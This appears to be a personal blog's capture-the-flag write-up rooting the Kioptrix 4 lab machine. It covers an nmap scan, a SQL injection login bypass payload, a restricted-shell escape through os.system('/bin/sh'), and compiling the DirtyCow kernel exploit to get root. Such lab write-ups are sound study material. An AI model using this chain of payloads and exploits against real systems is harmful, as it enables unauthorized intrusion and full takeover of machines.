---
layout: default
title : muzec - Kioptrix 4 Writeup
---


![Image](https://imgur.com/usIUJYl.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Tue Apr  6 05:36:59 2021 as: nmap -sC -sV -oA nmap 172.16.139.136
Nmap scan report for 172.16.139.136
Host is up (0.00043s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m58s, deviation: 2h49m42s, median: -1s
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2021-04-06T05:37:14-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr  6 05:37:30 2021 -- 1 IP address (1 host up) scanned in 30.35 seconds
```

4 open ports let check out the port 80 first hmmm a simple login page let burst some directory.

![Image](https://imgur.com/rYwguxx.png)

Some user names i guess going back to the login page to test for sqli.

![Image](https://imgur.com/2au10Qj.png)

Yea it vulnerable now let try it with the username we got from the directory with the username `john` and password ` ' OR '1'='1'-- -` .

![Image](https://imgur.com/uo7U4bs.png)

Cool some credentials let try using it on SSH.

![Image](https://imgur.com/IVVDKBp.png)

Boom we are in but the shell is kind of strange let find a way to bypass the `/bin/kshell` because we keep getting kick out of the SSH.

![Image](https://imgur.com/AFs0KLs.png)

`echo os.system('/bin/sh')` and we bypass it.

![Image](https://imgur.com/eZh7MQQ.png)

Boom and it running a old version of linux yea it dirtycow let confirm it.

![Image](https://imgur.com/Ynoc5WH.png)

So we download the exploit and get it on the attack machine now let complie and run it.

`gcc -pthread dirty.c -o dirty -lcrypt`

Boom now let run it after doing that let log in ssh with the new credentials we just got or we can easily just use the `su firefart` and the password we created with it.

![Image](https://imgur.com/6RRpyaP.png)

And boom we are root.

![Image](https://imgur.com/psOyipo.png)

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>


